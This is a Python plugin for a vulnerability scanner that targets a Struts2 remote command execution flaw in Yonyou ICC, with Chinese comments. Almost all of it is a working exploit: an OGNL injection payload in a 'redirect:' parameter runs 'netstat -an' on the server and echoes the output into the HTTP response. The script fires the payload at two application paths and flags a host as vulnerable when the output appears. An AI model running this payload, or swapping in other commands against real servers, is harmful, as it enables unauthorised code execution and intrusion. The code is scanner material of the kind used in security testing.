#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友ICC struts2远程命令执行
referer: http://www.wooyun.org/bugs/wooyun-2010-023876
author: Lucifer
description: 用友ICC系统存在struts2框架漏洞。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
urls=["/web/icc/chat/chat?c=1&s=1","/web/common/doUpload.action"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for turl in urls:
            payload_url = scheme+"://"+url+turl+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('active internet connections')!=-1:
                Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas